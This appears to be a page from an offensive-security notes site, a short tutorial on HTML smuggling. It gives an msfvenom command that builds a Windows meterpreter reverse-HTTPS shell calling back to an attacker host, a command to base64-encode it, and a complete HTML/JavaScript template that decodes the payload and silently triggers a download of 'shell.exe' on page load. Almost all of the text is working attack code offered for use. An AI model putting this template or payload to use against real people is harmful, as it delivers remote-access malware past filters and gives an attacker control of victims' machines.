---
title: HTML Smuggling
layout: default
parent: Client Side Execution
---

First generate a meterpreter shell:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT -f exe -o /tmp/shell.exe
```

Then base64 the whole thing:

```bash
base64 /tmp/shell.exe
```

Remove all **line break** or **new lines**

Add the whole thing to below and serve as html:

```html
<html>
<body>
<script>
function base64ToArrayBuffer(base64) {
var binary_string = window.atob(base64);
var len = binary_string.length;
var bytes = new Uint8Array( len );
for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i);
}
return bytes.buffer;
}
var file ='BASE64 PAYLOAD NEWLINE/BREAK REMOVED'
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'shell.exe';
var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
</script>
</body>
</html>
```
